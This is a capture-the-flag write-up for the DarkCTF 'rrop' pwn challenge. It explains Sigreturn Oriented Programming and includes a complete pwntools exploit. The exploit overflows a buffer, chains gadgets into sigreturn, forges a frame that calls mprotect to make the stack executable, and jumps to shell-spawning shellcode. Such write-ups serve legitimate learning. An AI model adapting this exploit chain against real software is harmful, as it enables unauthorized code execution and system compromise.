## DarkCTF: rrop [pwn]
> Even though Solar Designer gave you his times technique, you have to resolve(sort-out) yourself and go deeper. This time rope willn't let you have anything you want but you have to make a fake rope and get everything.

## Notes
#### I didn't solve this during the ctf rather I studied the exploit of the challenge author plus read some other writeups regarding the exploit class as well. The exploit used to solve the challenge is a technique called `Sigreturn Oriented Programming (SROP)` in which when a signal occurs, the kernel “pauses” the process’s execution in order to jump to a signal handler routine. In order to safely resume the execution after the handler, the context of that process is pushed/saved on the stack (registers, flags, instruction pointer, stack pointer etc). When the handler is finished, sigreturn() is being called which will restore the context of the process by popping the values off of the stack. That’s what is being exploited in that technique. (Amriunix)

#### Basically the two important gadgets we need to do the exploit (which are easily provided in this case) are gadgets to set rax to 0xf and to syscall. We also need access to a user controlled data, and from there ways to approach it differ. For this challenge, we made a rop chain to set rax to 0xf and use the syscall to call sigreturn which takes our fake stack frame that we constructed to call mprotect on a stack region which we placed our shellcode, then return to the shellcode after making the stack executable. I will need more experience with challenges that involve this technique. Here is the exploit code I used. 

```python
from pwn import *

#: Connect to challenge server
p = process('./rrop')
binary = ELF('./rrop', checksec = False)

#p = remote('rrop.darkarmy.xyz', 7001)
#gdb.attach(p.pid, 'break *main + 88')
print(p.recvuntil('@'))
buffer_leak = int(p.recvuntil(',').strip(','), 16)
print('[*] buffer leak: {}'.format(hex(buffer_leak)))
print(p.recv())

#: craft exploit
context.arch = 'amd64'
eax_rax = 0x4007dc
usefulf = 0x4007d2

exploit = asm(shellcraft.amd64.linux.sh())
exploit += cyclic(216 - len(exploit))
exploit += p64(eax_rax)
exploit += p64(usefulf)

#: forge sigreturn structure
sigreturn_frame = SigreturnFrame(kernel = 'amd64')
sigreturn_frame.rax = 10 #: mprotect syscall number
sigreturn_frame.rdx = 7 #: rwx permissions
sigreturn_frame.rdi = buffer_leak & ~0xfff #: for some reason, I can't directly mprotect the user input buffer but for some other stack address it works. need clarification here.
sigreturn_frame.rsi = 1000 #: size to mprotect
sigreturn_frame.rsp = buffer_leak + len(exploit) + 248 #: fake stack frame, 248 is the size of the fake sigcontext structure
sigreturn_frame.rip = usefulf #: set rip to syscall

#: set up fake sigcontext structure
exploit += str(sigreturn_frame) #: executes the mprotect call with the placed arguments
exploit += p64(buffer_leak) #: returns to the address of the shellcode, which is already set to rwx

p.sendline(exploit)
p.interactive()
```

#### Reading resources:
```
#: https://amriunix.com/post/sigreturn-oriented-programming-srop/
#: https://0x00sec.org/t/srop-signals-you-say/2890
#: https://www.cs.vu.nl/~herbertb/papers/srop_sp14.pdf
#: https://hackmd.io/@imth/SROP
#: https://github.com/Internaut401/CTF_Writeup/blob/master/2020/DarkCTF/rrop.md
#: https://github.com/gr4n173/CTF-WriteUp/tree/master/Darkctf/pwn/rrop
```